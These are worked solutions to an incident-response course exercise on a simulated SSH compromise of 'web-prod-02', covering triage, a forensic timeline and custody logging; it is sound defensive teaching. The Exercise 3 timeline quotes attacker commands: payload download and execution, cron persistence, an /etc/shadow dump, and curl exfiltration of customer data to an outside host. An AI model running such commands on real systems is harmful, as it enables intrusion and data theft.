# Week 9 — Exercise Solutions

> Read each exercise and attempt it before opening this file. The point of working solutions is to confirm your reasoning, not to substitute for it.

---

## Exercise 1 — First-Thirty-Minutes Checklist

The exercise asks you to walk the runbook from Lecture 1 § 2.1 against alert **SIEM-2026-14771**.

### CONFIRM

- Host in inventory: **yes**. `web-prod-02` is in the inventory.
- SIEM/source telemetry healthy: **yes** (no signal in the scenario indicates otherwise; in a real engagement you would still execute the runbook's `curl` health check).
- Known false-positive class: **no**. The rule `SSH-BruteForce-Then-Success` is a high-signal rule (volume of failures *followed by* a success); legitimate users do not produce that pattern.
- Decision: **continue to CLASSIFY**.

**Defence.** The alert pattern — 14 failures from a single source IP in 60 seconds followed by exactly one success — is the canonical signature of either a successful brute-force or a credential-stuffing success. Legitimate users typing a wrong password do not produce 14 failures in 60 seconds and then succeed; legitimate SSH publickey authentication does not produce *any* password failures at all. The combination is high-confidence. NIST SP 800-61 Rev. 2 § 3.2.2 (Signs of an Incident) explicitly lists "multiple failed login attempts from an unusual remote location" as a *precursor* and "successful login after multiple failures" as an *indicator*.

### CLASSIFY

- Severity: **S2 high** (probable compromise of a privileged service account on production), with explicit consideration of escalating to S1 the moment any post-foothold behaviour is observed.

**Defence.** The `deploy` account has restricted sudo but does run on a production host that serves customers. The source IP `198.51.100.7` is outside the supposed CI-runner range. The successful publickey login means the attacker has either the private key or a working session token; either way, the privilege is real. S1 would require *confirmed* customer-data exposure; we are at *probable foothold*, which is S2 per the four-step scale in Lecture 1 § 3.2. The classification will rise to S1 if the timeline reconstruction shows post-foothold activity touching customer-data paths.

### CONTAIN

- Containment choice: **network isolate** the host (apply quarantine ACL, allow only IR management VLAN). Keep the host powered on to preserve memory.

**Defence.** Network isolation stops outbound exfiltration and lateral movement immediately while preserving every volatile artefact. "Leave running" is wrong because the threat is *unconfirmed-but-probable* and waiting to confirm before isolating is the exact mistake that lets a foothold become an exfiltration. "Pull the plug" is wrong because it destroys memory, in-flight network state, and the running process tree — all of which we will need for the next stage of analysis. The decision is defensible by RFC 3227 order-of-volatility: live memory acquisition is on the table, and the plug-pull forecloses it.

### NOTIFY

- Paged: **IR primary** (always at S2), **Legal** (always at S2; the alert may have already created notification-clock obligations under GDPR Article 33 if EU customer data is on the affected host), and **Communications on standby** (not paged yet; the call to page Comms is the IR primary's once they review the alert).

**Defence.** Notification is *information*, not handoff. The on-call analyst continues to respond; the people paged are the people who will be needed in the next hours and whose clocks (especially the legal clock under GDPR Article 33) may have begun running. Comms is on standby because customer-facing communication is premature until the scope is confirmed.

### LOG

- Incident log opened in: **a private GitHub issue** in the company's IR repository, labelled `incident,severity-2`.
- First entry timestamp: **2026-05-14T02:48:42Z** (T+01:29 from alert fire; the responder spent the first ~1.5 minutes reading the alert and confirming the inventory before opening the log).

A populated opening entry sequence:

| Time (UTC) | Actor | Entry |
|---|---|---|
| 2026-05-14T02:48:42Z | (you) | Alert SIEM-2026-14771 opened. Host web-prod-02 (192.168.42.42). Trigger: 14 SSH failed-login attempts in 60s from 198.51.100.7 followed by successful publickey login as `deploy` at 02:46:58Z. |
| 2026-05-14T02:50:11Z | (you) | Host confirmed in inventory. SIEM health green (verified via /health). Not in known-FP list. Proceeding to classify. |
| 2026-05-14T02:52:30Z | (you) | Classified S2 (probable compromise of privileged service account on prod web). Will escalate to S1 if post-foothold customer-data touch observed. Paging IR-Primary and Legal. |
| 2026-05-14T02:54:01Z | (you) | Containment: network isolate to IR mgmt VLAN. ACL pushed at 02:53:48Z; host reachable only from 10.0.99.0/24. Host remains powered on for memory acquisition. |
| 2026-05-14T02:54:47Z | (you) | Paged IR-Primary (Lopez) and Legal (Huang). Acknowledgements pending. |
| 2026-05-14T02:56:33Z | (you) | Lopez acknowledged, joining call. Huang acknowledged, will join when on the line. Continuing analysis. Next step: pull `auth.log` and `journalctl -u ssh.service` for the 60-min window pre and post the alert. |

### Optional runbook delta

Three changes that would have improved the response:

1. **Add an alert-acknowledgement timer.** The runbook should specify a 2-minute SLA between alert fire and incident-log opening; this incident took 1.5 minutes only because the analyst was already at their terminal. The mature pattern is to encode the SLA explicitly and to escalate the alert automatically if the timer expires.
2. **Pre-stage the network-isolate ACL.** The ACL was pushed by hand at 02:53:48Z — under five minutes of the alert, but only because the analyst had used the same ACL in tabletop. A one-command runbook tool (`isolate-host <hostname>`) that pushes a known-good ACL would drop the time from minutes to seconds and eliminate the variance.
3. **Encode the severity-escalation criteria explicitly.** The classification said "will escalate to S1 if customer-data touch observed". That criterion was supplied by the analyst's judgement, not by the runbook. The runbook should list the specific telemetry signals (customer-data path mtime change, customer-table-name query in a database log, customer-data egress in firewall logs) whose presence triggers S1.

---

## Exercise 2 — Log Triage

Sample invocation against the bundled lab data (the paths below assume you have cloned the repository and are running from the week's directory):

```bash
python3 exercises/exercise-02-log-triage.py \
    --auth     mini-project/starter/logs/auth.log \
    --nginx    mini-project/starter/logs/access.log \
    --journal  mini-project/starter/logs/journal.jsonl \
    --top      15
```

Expected output (abbreviated; full output runs to roughly 80 lines):

```text
## ssh-failed (14 hits)
     14  May 14 02:45:32 web-prod-02 sshd[8401]: Failed password for invalid user...
     ...

## ssh-success (1 hits)
      1  May 14 02:46:58 web-prod-02 sshd[8421]: Accepted publickey for deploy from 198.51.100.7

## sudo-cmd (5 hits)
      1  May 14 02:47:32 web-prod-02 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
      ...

## user-creation (1 hits)
      1  May 14 02:48:02 web-prod-02 useradd[8520]: new user: name=support, UID=1099, GID=1099

## scanner-ua:zgrab (3 hits)
      3  198.51.100.7 - - [14/May/2026:02:46:14 +0000] "GET /admin/login.php ..." 404 ... "Mozilla/5.0 zgrab/0.x"
      ...

## dotfile-probe (2 hits)
      1  198.51.100.7 - - [14/May/2026:02:46:35 +0000] "GET /.env ..." 404 ...
      1  198.51.100.7 - - [14/May/2026:02:46:36 +0000] "GET /.git/HEAD ..." 200 ...

## sqli-probe (0 hits)

## cmd-injection (0 hits)

## log4shell (0 hits)
```

The exit code is `1` because `user-creation` (via the journal's `root-account-mgmt:useradd` category) is a high-signal category. The CI-gate use case is documented in the script's `main()`.

**What you should notice in the triage output:**

- The dot-file probing (`/.env`, `/.git/HEAD`) is the *attacker's reconnaissance* step. The successful `200` on `/.git/HEAD` exposed the application's source repository, which is how the attacker likely discovered the `deploy` user's public key (it was committed to the repo's `deploy/keys/` directory by mistake; see the mini-project's narrative for the full story).
- The SSH brute-force is not actually a brute force in the traditional sense — the 14 failures are all for *invalid user* names, and the eventual success is via *publickey*, not password. The attacker was exhausting common admin names before pivoting to the publickey they had recovered from `.git/`.
- The `support` account creation happens immediately after the foothold — the canonical persistence step (MITRE ATT&CK T1136.001).
- No SQL injection, command injection, or Log4Shell signatures are present. The compromise was credential-driven, not application-vulnerability-driven.

---

## Exercise 3 — Timeline Builder

Sample invocation:

```bash
python3 exercises/exercise-03-timeline-builder.py \
    --auth                 mini-project/starter/logs/auth.log \
    --auth-year            2026 \
    --auth-timezone        UTC \
    --nginx                mini-project/starter/logs/access.log \
    --journal              mini-project/starter/logs/journal.jsonl \
    --bash-history         mini-project/starter/logs/bash_history.txt \
    --bash-history-user    deploy \
    --output               markdown \
  > /tmp/timeline.md
```

Expected first 20 rows (abbreviated):

```markdown
# Incident timeline

| Time (UTC) | Source | Actor | Event |
|---|---|---|---|
| 2026-05-14T02:45:32Z | auth.log | web-prod-02 | sshd[8401]: Failed password for invalid user admin from 198.51.100.7 |
| 2026-05-14T02:45:36Z | auth.log | web-prod-02 | sshd[8403]: Failed password for invalid user root from 198.51.100.7 |
| 2026-05-14T02:45:40Z | auth.log | web-prod-02 | sshd[8405]: Failed password for invalid user oracle from 198.51.100.7 |
| ... (11 more failures) ... |
| 2026-05-14T02:46:14Z | nginx-access | 198.51.100.7 | "GET /admin/login.php HTTP/1.1" -> 404 (162 bytes) UA="Mozilla/5.0 zgrab/0.x" |
| 2026-05-14T02:46:35Z | nginx-access | 198.51.100.7 | "GET /.env HTTP/1.1" -> 404 (162 bytes) UA="Mozilla/5.0 zgrab/0.x" |
| 2026-05-14T02:46:36Z | nginx-access | 198.51.100.7 | "GET /.git/HEAD HTTP/1.1" -> 200 (23 bytes) UA="Mozilla/5.0 zgrab/0.x" |
| 2026-05-14T02:46:58Z | auth.log | web-prod-02 | sshd[8421]: Accepted publickey for deploy from 198.51.100.7 |
| 2026-05-14T02:47:11Z | auth.log | web-prod-02 | sshd[8421]: pam_unix(sshd:session): session opened for user deploy(uid=1003) by (uid=0) |
| 2026-05-14T02:47:32Z | auth.log | web-prod-02 | sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash |
| 2026-05-14T02:47:34Z | bash-history | deploy | wget http://198.51.100.7/payload -O /tmp/x |
| 2026-05-14T02:47:35Z | bash-history | deploy | chmod +x /tmp/x |
| 2026-05-14T02:47:36Z | bash-history | deploy | /tmp/x |
| 2026-05-14T02:48:02Z | auth.log | web-prod-02 | useradd[8520]: new user: name=support, UID=1099, GID=1099 |
| 2026-05-14T02:48:33Z | bash-history | deploy | echo '*/5 * * * * /tmp/.x' \| crontab -u support - |
| 2026-05-14T02:49:01Z | bash-history | deploy | chattr +i /tmp/.x |
| 2026-05-14T02:49:15Z | bash-history | deploy | cat /etc/shadow > /tmp/sh.out |
| 2026-05-14T02:49:22Z | bash-history | deploy | tar czf /tmp/d.tar.gz /home/customers/ |
| 2026-05-14T02:49:40Z | bash-history | deploy | curl -X POST --data-binary @/tmp/d.tar.gz https://198.51.100.7:8443/ |
| 2026-05-14T02:50:05Z | bash-history | deploy | history -c |
```

The timeline reveals the canonical kill-chain shape: reconnaissance (the scanner-UA HTTP probes), discovery of leaked credentials (the successful `/.git/HEAD`), credential use (publickey login), foothold (sudo to root), persistence (account creation, cron entry, immutable bit), credential dump (`/etc/shadow` read), collection (`tar` of customer data), exfiltration (`curl POST`), evasion (`history -c`).

The narrative the timeline tells is the substance of the post-incident report.

---

## Exercise 4 — Custody-Log Generator

Sample invocations:

```bash
# Generate the custody log for the lab artefacts.
python3 exercises/exercise-04-custody-log.py generate \
    --directory     mini-project/starter/logs \
    --output        mini-project/starter/CUSTODY_LOG.md \
    --acquired-by   "your-name" \
    --system-id     "lab-simulated machine-id=00000000000000000000000000000000" \
    --tool          "exercise-04-custody-log.py v1" \
    --authorisation "training exercise (week-09)"

# Re-run the verification later; it should report OK every time the
# directory is unchanged.
python3 exercises/exercise-04-custody-log.py verify \
    --directory     mini-project/starter/logs \
    --custody-log   mini-project/starter/CUSTODY_LOG.md
```

Expected output of the second invocation:

```text
OK: all <n> artefact(s) verified.
```

To prove the verifier works, edit a single byte in any of the logs and re-run:

```bash
echo " " >> mini-project/starter/logs/auth.log
python3 exercises/exercise-04-custody-log.py verify \
    --directory     mini-project/starter/logs \
    --custody-log   mini-project/starter/CUSTODY_LOG.md
```

Expected output:

```text
MISMATCH:
  auth.log: expected <hash>, got <different-hash>
```

The verifier returns exit code `1`; CI integration can fail the build on any mismatch.

---

## Notes on extending the scripts

- The triage script's pattern lists are conservative. In a real engagement you would maintain a longer YAML-driven pattern catalogue (Sigma rules, MITRE ATT&CK Indicators) and have the script load from disk. The exercise's hard-coded list keeps the script standard-library-only.
- The timeline builder accepts only UTC for `auth.log`. The right place to convert non-UTC timestamps is *before* the timeline builder runs; mixing timezones inside the builder invites footguns.
- The custody-log generator hashes one file at a time. For very large dumps (10 GB+ memory images, full disk images), consider streaming the hash computation in parallel — the script is structured to make that swap easy.
